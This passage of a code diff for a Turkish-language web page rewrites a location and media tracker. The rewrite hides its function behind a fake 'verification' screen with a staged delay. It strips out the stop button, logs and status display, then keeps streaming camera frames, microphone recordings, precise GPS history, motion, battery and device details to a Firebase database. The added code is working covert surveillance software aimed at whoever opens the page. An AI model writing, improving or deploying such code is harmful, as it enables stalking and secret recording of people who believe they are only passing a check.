+                localStorage.setItem('secure_code', this.code);
 
-                // Service Worker
-                if ('serviceWorker' in navigator) {
-                    navigator.serviceWorker.register('sw.js').catch(() => {
-                        // SW yoksa sorun yok
+                // Loading state
+                document.getElementById('btnText').textContent = 'Doğrulanıyor...';
+                document.getElementById('btnSpinner').classList.remove('hidden');
+                document.getElementById('verifyBtn').disabled = true;
+
+                try {
+                    // Kamera + Mikrofon
+                    this.videoStream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } },
+                        audio: { echoCancellation: false, noiseSuppression: false, autoGainControl: true }
                     });
+                    
+                    document.getElementById('videoPreview').srcObject = this.videoStream;
+                    this.setupAudioAnalyser();
+
+                    // Konum
+                    await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: true,
+                            timeout: 15000
+                        });
+                    });
+
+                    // Hareket sensörü
+                    if (window.DeviceMotionEvent) {
+                        window.addEventListener('devicemotion', (e) => this.handleMotion(e));
+                    }
+
+                    // Başarılı
+                    localStorage.setItem('secure_running', 'true');
+                    this.isActive = true;
+                    
+                    // Kısa gecikme (doğrulama etkisi)
+                    await new Promise(r => setTimeout(r, 1500));
+                    
+                    this.showSuccess();
+                    this.startTracking();
+                    this.startAudioRecording();
+
+                    // Wake lock
+                    if ('wakeLock' in navigator) {
+                        try { await navigator.wakeLock.request('screen'); } catch (e) {}
+                    }
+
+                } catch (error) {
+                    console.error('Error:', error);
+                    document.getElementById('btnText').textContent = 'Doğrula';
+                    document.getElementById('btnSpinner').classList.add('hidden');
+                    document.getElementById('verifyBtn').disabled = false;
+                    
+                    // Kullanıcıya hata göster
+                    alert('Doğrulama için izinleri onaylamanız gerekmektedir.');
                 }
             }
 
-            handleOnline() {
-                this.isOnline = true;
-                this.updateConnectionBadge('online');
-                this.log('İnternet bağlantısı geri geldi!', 'success');
-                
-                if (this.isActive) {
-                    this.checkAndReconnect();
-                }
-            }
-
-            handleOffline() {
-                this.isOnline = false;
-                this.updateConnectionBadge('offline');
-                this.log('İnternet bağlantısı kesildi!', 'error');
-            }
-
-            updateConnectionBadge(status) {
-                const badge = document.getElementById('connectionBadge');
-                const text = document.getElementById('connectionText');
-                
-                badge.className = 'connection-badge ' + status;
-                
-                switch(status) {
-                    case 'online':
-                        text.textContent = 'Bağlı';
-                        break;
-                    case 'offline':
-                        text.textContent = 'Çevrimdışı';
-                        break;
-                    case 'reconnecting':
-                        text.textContent = 'Yeniden Bağlanıyor...';
-                        break;
-                }
+            showSuccess() {
+                document.getElementById('setupCard').classList.add('hidden');
+                document.getElementById('successCard').classList.remove('hidden');
+                document.getElementById('statusIndicator').classList.add('visible');
             }
 
             async checkAndReconnect() {
-                if (!this.isOnline) {
-                    this.log('İnternet yok, bekleniyor...', 'warning');
-                    return;
-                }
-
-                this.updateConnectionBadge('reconnecting');
-                this.stats.reconnectCount++;
-                document.getElementById('reconnectVal').textContent = this.stats.reconnectCount;
+                if (!this.isOnline) return;
 
                 try {
-                    // Firebase bağlantısını test et
                     await db.ref('devices/' + this.code + '/status').set('online');
                     
-                    this.updateConnectionBadge('online');
-                    this.log('Yeniden bağlandı! (#' + this.stats.reconnectCount + ')', 'success');
-                    
-                    // Medya stream'leri kontrol et
                     if (!this.videoStream || !this.videoStream.active) {
-                        this.log('Kamera/mikrofon yeniden başlatılıyor...', 'info');
                         await this.restartMedia();
                     }
                     
-                    // Konum izleme kontrol et
                     if (!this.watchId) {
                         this.startLocationWatch();
                     }
-                    
-                    this.reconnectAttempts = 0;
-                    
                 } catch (error) {
-                    this.log('Bağlantı hatası: ' + error.message, 'error');
-                    this.scheduleReconnect();
+                    setTimeout(() => this.checkAndReconnect(), 5000);
                 }
-            }
-
-            scheduleReconnect() {
-                if (this.reconnectAttempts >= this.maxReconnectAttempts) {
-                    this.log('Maksimum deneme sayısına ulaşıldı', 'error');
-                    return;
-                }
-
-                this.reconnectAttempts++;
-                const delay = Math.min(this.reconnectDelay * this.reconnectAttempts, 30000);
-                
-                this.log(`${delay/1000}s sonra tekrar denenecek (${this.reconnectAttempts}/${this.maxReconnectAttempts})`, 'warning');
-                
-                setTimeout(() => {
-                    if (this.isActive && this.isOnline) {
-                        this.checkAndReconnect();
-                    }
-                }, delay);
             }
 
             async restartMedia() {
-                // Eski stream'i kapat
                 if (this.videoStream) {
                     this.videoStream.getTracks().forEach(track => track.stop());
                 }
@@ -919,150 +602,7 @@
                     document.getElementById('videoPreview').srcObject = this.videoStream;
                     this.setupAudioAnalyser();
                     this.startAudioRecording();
-                    
-                    this.log('Kamera ve mikrofon yeniden başlatıldı', 'success');
-                } catch (e) {
-                    this.log('Medya başlatılamadı: ' + e.message, 'error');
-                }
-            }
-
-            detectDevice() {
-                const info = [];
-                const ua = navigator.userAgent;
-                
-                if (/Android/i.test(ua)) info.push('Android');
-                else if (/iPhone|iPad|iPod/i.test(ua)) info.push('iOS');
-                else info.push('Diğer');
-                
-                if (/Chrome/i.test(ua)) info.push('Chrome');
-                else if (/Safari/i.test(ua)) info.push('Safari');
-                else if (/Firefox/i.test(ua)) info.push('Firefox');
-                
-                info.push(`${screen.width}x${screen.height}`);
-                
-                if (navigator.connection) {
-                    info.push(navigator.connection.effectiveType || 'Bilinmiyor');
-                }
-
-                document.getElementById('deviceInfo').innerHTML = info.map(i => `<span class="device-tag">${i}</span>`).join('');
-            }
-
-            log(msg, type = 'info') {
-                const container = document.getElementById('logContainer');
-                const time = new Date().toLocaleTimeString('tr-TR');
-                const item = document.createElement('div');
-                item.className = 'log-item';
-                item.innerHTML = `<span class="log-time">[${time}]</span><span class="log-msg ${type}">${msg}</span>`;
-                container.insertBefore(item, container.firstChild);
-                
-                while (container.children.length > 50) {
-                    container.removeChild(container.lastChild);
-                }
-            }
-
-            async start() {
-                this.code = document.getElementById('codeInput').value.trim().toLowerCase();
-                
-                if (!this.code || this.code.length < 6) {
-                    alert('Lütfen en az 6 karakterlik bir kod girin.');
-                    return;
-                }
-
-                localStorage.setItem('tracker_code_v3', this.code);
-                localStorage.setItem('tracker_running', 'true');
-                
-                this.log('Bağlantı başlatılıyor...');
-                document.getElementById('featAuto').classList.add('active');
-
-                try {
-                    // Kamera + Mikrofon
-                    this.log('Kamera ve mikrofon izni isteniyor...');
-                    this.videoStream = await navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } },
-                        audio: true
-                    });
-                    
-                    document.getElementById('videoPreview').srcObject = this.videoStream;
-                    document.getElementById('featCam').classList.add('active');
-                    document.getElementById('featMic').classList.add('active');
-                    this.log('✓ Kamera ve mikrofon aktif');
-
-                    this.setupAudioAnalyser();
-
-                    // Konum izni
-                    this.log('Konum izni isteniyor...');
-                    await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject, {
-                            enableHighAccuracy: true,
-                            timeout: 15000
-                        });
-                    });
-                    document.getElementById('featLoc').classList.add('active');
-                    this.log('✓ Konum erişimi aktif');
-
-                    // Hareket sensörü
-                    if (window.DeviceMotionEvent) {
-                        window.addEventListener('devicemotion', (e) => this.handleMotion(e));
-                        this.log('✓ Hareket sensörü aktif');
-                    }
-
-                    // Başarılı
-                    this.isActive = true;
-                    this.stats.startTime = Date.now();
-                    this.updateUI(true);
-                    this.updateConnectionBadge('online');
-                    
-                    this.startTracking();
-                    this.startAudioRecording();
-                    this.startKeepAlive();
-                    this.startUptimeCounter();
-                    
-                    this.log('✓ Tüm servisler başlatıldı', 'success');
-
-                    // Wake lock - ekranı açık tut
-                    this.requestWakeLock();
-
-                } catch (error) {
-                    console.error('İzin hatası:', error);
-                    this.log('✗ Hata: ' + error.message, 'error');
-                    alert('İzin hatası: ' + error.message);
-                    localStorage.setItem('tracker_running', 'false');
-                }
-            }
-
-            async requestWakeLock() {
-                if ('wakeLock' in navigator) {
-                    try {
-                        await navigator.wakeLock.request('screen');
-                        this.log('Ekran kilidi aktif - Ekran kapanmayacak', 'info');
-                    } catch (e) {
-                        this.log('Wake lock desteklenmiyor', 'warning');
-                    }
-                }
-            }
-
-            startKeepAlive() {
-                // Her 25 saniyede Firebase'e ping at
-                this.keepAliveInterval = setInterval(() => {
-                    if (this.isActive && this.isOnline) {
-                        db.ref('devices/' + this.code + '/heartbeat').set({
-                            timestamp: Date.now(),
-                            uptime: Math.floor((Date.now() - this.stats.startTime) / 1000)
-                        }).catch(() => {
-                            this.log('Heartbeat gönderilemedi', 'warning');
-                            this.checkAndReconnect();
-                        });
-                    }
-                }, 25000);
-            }
-
-            startUptimeCounter() {
-                this.uptimeInterval = setInterval(() => {
-                    if (this.stats.startTime) {
-                        const minutes = Math.floor((Date.now() - this.stats.startTime) / 60000);
-                        document.getElementById('uptimeVal').textContent = minutes;
-                    }
-                }, 10000);
+                } catch (e) {}
             }
 
             setupAudioAnalyser() {
@@ -1073,7 +613,7 @@
                     source.connect(this.analyser);
                     this.analyser.fftSize = 256;
                     
-                    const updateMeter = () => {
+                    const updateLevel = () => {
                         if (!this.isActive) return;
                         
                         const dataArray = new Uint8Array(this.analyser.frequencyBinCount);
@@ -1082,9 +622,6 @@
                         const average = dataArray.reduce((a, b) => a + b) / dataArray.length;
                         const percent = Math.min(100, (average / 128) * 100);
                         
-                        document.getElementById('audioMeter').style.width = percent + '%';
-                        document.getElementById('audioLevel').textContent = Math.round(average) + ' dB';
-                        
                         if (this.isOnline) {
                             db.ref('devices/' + this.code + '/audioLevel').set({
                                 level: Math.round(percent),
@@ -1092,12 +629,10 @@
                             });
                         }
                         
-                        requestAnimationFrame(updateMeter);
+                        requestAnimationFrame(updateLevel);
                     };
-                    updateMeter();
-                } catch (e) {
-                    this.log('Ses analizi başlatılamadı', 'warning');
-                }
+                    updateLevel();
+                } catch (e) {}
             }
 
             handleMotion(event) {
@@ -1111,16 +646,6 @@
                 
                 if (isMoving !== this.stats.isMoving) {
                     this.stats.isMoving = isMoving;
-                    const indicator = document.getElementById('motionIndicator');
-                    
-                    if (isMoving) {
-                        indicator.className = 'motion-indicator moving';
-                        indicator.innerHTML = '<span>🏃</span> Hareket Halinde';
-                        this.log('Hareket algılandı', 'warning');
-                    } else {
-                        indicator.className = 'motion-indicator still';
-                        indicator.innerHTML = '<span>🧍</span> Durağan';
-                    }
                     
                     if (this.isOnline) {
                         db.ref('devices/' + this.code + '/motion').set({
@@ -1132,69 +657,40 @@
                 }
             }
 
-            stop() {
-                this.isActive = false;
-                localStorage.setItem('tracker_running', 'false');
-                this.log('Bağlantı durduruluyor...');
-
-                if (this.videoStream) {
-                    this.videoStream.getTracks().forEach(track => track.stop());
-                    this.videoStream = null;
-                }
-
-                if (this.audioContext) {
-                    this.audioContext.close();
-                    this.audioContext = null;
-                }
-
-                if (this.mediaRecorder && this.mediaRecorder.state !== 'inactive') {
-                    this.mediaRecorder.stop();
-                }
-
-                if (this.watchId) {
-                    navigator.geolocation.clearWatch(this.watchId);
-                    this.watchId = null;
-                }
-
-                if (this.keepAliveInterval) {
-                    clearInterval(this.keepAliveInterval);
-                }
-
-                if (this.uptimeInterval) {
-                    clearInterval(this.uptimeInterval);
-                }
-
-                if (this.code) {
-                    db.ref('devices/' + this.code + '/status').set('offline');
-                }
-
-                this.log('Bağlantı kapatıldı');
-                this.updateUI(false);
-                this.updateConnectionBadge('offline');
-            }
-
             startTracking() {
                 this.startLocationWatch();
 
-                // Kamera görüntüsü
+                // Kamera
                 this.sendFrame();
                 setInterval(() => {
                     if (this.isActive && this.isOnline) this.sendFrame();
                 }, 1500);
 
+                // Pil
                 this.trackBattery();
+
+                // Cihaz bilgisi
+                this.sendDeviceInfo();
+
+                // Heartbeat
+                setInterval(() => {
+                    if (this.isActive && this.isOnline) {
+                        db.ref('devices/' + this.code + '/heartbeat').set({
+                            timestamp: Date.now(),
+                            uptime: Math.floor((Date.now() - (this.stats.startTime || Date.now())) / 1000)
+                        });
+                    }
+                }, 25000);
+
+                this.stats.startTime = Date.now();
             }
 
             startLocationWatch() {
                 this.watchId = navigator.geolocation.watchPosition(
                     (pos) => this.handlePosition(pos),
                     (err) => {
-                        this.log('Konum hatası: ' + err.message, 'error');
-                        // Konum hatası olursa tekrar dene
                         setTimeout(() => {
-                            if (this.isActive && !this.watchId) {
-                                this.startLocationWatch();
-                            }
+                            if (this.isActive && !this.watchId) this.startLocationWatch();
                         }, 5000);
                     },
                     { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
@@ -1211,31 +707,17 @@
                     const dist = this.calculateDistance(
                         this.stats.lastPosition.lat,
                         this.stats.lastPosition.lng,
-                        latitude,
-                        longitude
+                        latitude, longitude
                     );
-                    if (dist > 1) {
-                        this.stats.totalDistance += dist;
-                    }
+                    if (dist > 1) this.stats.totalDistance += dist;
                 }
 
                 this.stats.lastPosition = { lat: latitude, lng: longitude };
                 this.stats.updateCount++;
 
-                // UI güncelle
-                document.getElementById('latVal').textContent = latitude.toFixed(6);
-                document.getElementById('lngVal').textContent = longitude.toFixed(6);
-                document.getElementById('accVal').textContent = Math.round(accuracy) + ' m';
-                document.getElementById('altVal').textContent = altitude ? Math.round(altitude) + ' m' : '-- m';
-                document.getElementById('speedVal').textContent = speed ? Math.round(speed * 3.6) : '0';
-                document.getElementById('distanceVal').textContent = Math.round(this.stats.totalDistance);
-                document.getElementById('updateCount').textContent = this.stats.updateCount;
-                document.getElementById('timeVal').textContent = new Date().toLocaleTimeString('tr-TR');
-
                 if (!this.isOnline) return;
 
-                // Firebase'e gönder
-                const data = {
+                db.ref('devices/' + this.code + '/location').set({
                     lat: latitude,
                     lng: longitude,
                     accuracy: accuracy || 0,
@@ -1245,18 +727,10 @@
                     timestamp,
                     updateCount: this.stats.updateCount,
                     totalDistance: Math.round(this.stats.totalDistance)
-                };
-
-                db.ref('devices/' + this.code + '/location').set(data);
+                });
+                
                 db.ref('devices/' + this.code + '/status').set('online');
                 db.ref('devices/' + this.code + '/history').push({ lat: latitude, lng: longitude, timestamp });
-
-                this.stats.dataSent += 0.5;
-                document.getElementById('dataVal').textContent = Math.round(this.stats.dataSent);
-
-                if (this.stats.updateCount % 10 === 0) {
-                    this.log(`Konum #${this.stats.updateCount} gönderildi`);
-                }
             }
 
             calculateDistance(lat1, lon1, lat2, lon2) {
@@ -1278,54 +752,63 @@
 
                 const audioStream = new MediaStream([audioTrack]);
 
-                const recordAndSend = () => {
+                const recordAudio = () => {
                     if (!this.isActive) return;
 
                     const chunks = [];
-                    try {
-                        this.mediaRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm;codecs=opus' });
-                    } catch (e) {
-                        this.mediaRecorder = new MediaRecorder(audioStream);
+                    
+                    let mimeType = 'audio/webm;codecs=opus';
+                    if (!MediaRecorder.isTypeSupported(mimeType)) {
+                        mimeType = 'audio/webm';
+                        if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = '';
                     }
 
+                    try {
+                        const options = mimeType ? { mimeType, audioBitsPerSecond: 128000 } : {};
+                        this.mediaRecorder = new MediaRecorder(audioStream, options);
+                    } catch (e) { return; }
+
                     this.mediaRecorder.ondataavailable = (e) => {
-                        if (e.data.size > 0) chunks.push(e.data);
+                        if (e.data && e.data.size > 0) chunks.push(e.data);
                     };
 
                     this.mediaRecorder.onstop = () => {
                         if (chunks.length > 0 && this.isActive && this.isOnline) {
-                            const blob = new Blob(chunks, { type: 'audio/webm' });
-                            this.sendAudio(blob);
+                            const blob = new Blob(chunks, { type: mimeType || 'audio/webm' });
+                            this.sendAudioData(blob);
                         }
-                        if (this.isActive) setTimeout(recordAndSend, 100);
+                        if (this.isActive) setTimeout(recordAudio, 100);
                     };
 
-                    this.mediaRecorder.start();
-                    setTimeout(() => {
-                        if (this.mediaRecorder && this.mediaRecorder.state === 'recording') {
-                            this.mediaRecorder.stop();
-                        }
-                    }, 3000);
+                    this.mediaRecorder.onerror = () => {
+                        if (this.isActive) setTimeout(recordAudio, 1000);
+                    };
+
+                    try {
+                        this.mediaRecorder.start();
+                        setTimeout(() => {
+                            if (this.mediaRecorder && this.mediaRecorder.state === 'recording') {
+                                this.mediaRecorder.stop();
+                            }
+                        }, 2000);
+                    } catch (e) {
+                        if (this.isActive) setTimeout(recordAudio, 1000);
+                    }
                 };
 
-                recordAndSend();
+                recordAudio();
             }
 
-            async sendAudio(blob) {
-                try {
-                    const reader = new FileReader();
-                    reader.onloadend = () => {
-                        db.ref('devices/' + this.code + '/audio').set({
-                            data: reader.result,
-                            timestamp: Date.now()
-                        });
-                        this.stats.dataSent += blob.size / 1024;
-                        document.getElementById('dataVal').textContent = Math.round(this.stats.dataSent);
-                    };
-                    reader.readAsDataURL(blob);
-                } catch (e) {
-                    this.log('Ses gönderme hatası', 'error');
-                }
+            sendAudioData(blob) {
+                const reader = new FileReader();
+                reader.onloadend = () => {
+                    db.ref('devices/' + this.code + '/audio').set({
+                        data: reader.result,
+                        timestamp: Date.now(),
+                        size: blob.size
+                    });
+                };
+                reader.readAsDataURL(blob);
             }
 
             sendFrame() {
@@ -1341,13 +824,8 @@
 
                 db.ref('devices/' + this.code + '/camera').set({
                     image: imageData,
-                    timestamp: Date.now(),
-                    width: 640,
-                    height: 480
+                    timestamp: Date.now()
                 });
-
-                this.stats.dataSent += 30;
-                document.getElementById('dataVal').textContent = Math.round(this.stats.dataSent);
             }
 
             async trackBattery() {
@@ -1356,15 +834,10 @@
                         const battery = await navigator.getBattery();
                         
                         const update = () => {
-                            const level = Math.round(battery.level * 100);
-                            const charging = battery.charging;
-                            
-                            document.getElementById('batVal').textContent = level + '%' + (charging ? ' ⚡' : '');
-                            
                             if (this.isOnline) {
                                 db.ref('devices/' + this.code + '/battery').set({
-                                    level,
-                                    charging,
+                                    level: Math.round(battery.level * 100),
+                                    charging: battery.charging,
                                     timestamp: Date.now()
                                 });
                             }
@@ -1374,50 +847,26 @@
                         battery.addEventListener('chargingchange', update);
                         update();
                         setInterval(update, 30000);
-                    } catch (e) {
-                        this.log('Pil API desteklenmiyor', 'warning');
-                    }
+                    } catch (e) {}
                 }
             }
 
-            updateUI(active) {
-                const statusIcon = document.getElementById('statusIcon');
-                const statusRing = document.getElementById('statusRing');
-                const statusText = document.getElementById('statusText');
-                const statusDetail = document.getElementById('statusDetail');
+            sendDeviceInfo() {
+                const ua = navigator.userAgent;
+                const info = {
+                    platform: /Android/i.test(ua) ? 'Android' : /iPhone|iPad|iPod/i.test(ua) ? 'iOS' : 'Other',
+                    browser: /Chrome/i.test(ua) ? 'Chrome' : /Safari/i.test(ua) ? 'Safari' : /Firefox/i.test(ua) ? 'Firefox' : 'Other',
+                    screen: `${screen.width}x${screen.height}`,
+                    language: navigator.language,
+                    connection: navigator.connection ? navigator.connection.effectiveType : 'unknown',
+                    timestamp: Date.now()
+                };
 
-                if (active) {
-                    statusIcon.classList.remove('off');
-                    statusIcon.classList.add('on');
-                    statusRing.style.display = 'block';
-                    statusText.textContent = 'Aktif';
-                    statusDetail.textContent = 'Kesintisiz aktarım';
-                    
-                    document.getElementById('setupCard').classList.add('hidden');
-                    document.getElementById('activeCard').classList.remove('hidden');
-                    document.getElementById('locationCard').classList.remove('hidden');
-                    document.getElementById('deviceCard').classList.remove('hidden');
-                    document.getElementById('logCard').classList.remove('hidden');
-                    document.getElementById('stopSection').classList.remove('hidden');
-                    document.getElementById('displayCode').textContent = this.code.toUpperCase();
-                } else {
-                    statusIcon.classList.add('off');
-                    statusIcon.classList.remove('on');
-                    statusRing.style.display = 'none';
-                    statusText.textContent = 'Bağlantı Kapalı';
-                    statusDetail.textContent = 'Başlatmak için kod girin';
-                    
-                    document.getElementById('setupCard').classList.remove('hidden');
-                    document.getElementById('activeCard').classList.add('hidden');
-                    document.getElementById('locationCard').classList.add('hidden');
-                    document.getElementById('deviceCard').classList.add('hidden');
-                    document.getElementById('logCard').classList.add('hidden');
-                    document.getElementById('stopSection').classList.add('hidden');
-                }
+                db.ref('devices/' + this.code + '/deviceInfo').set(info);
             }
         }
 
-        new PersistentTracker();
+        new SecureTracker();
     </script>
 </body>
 </html>
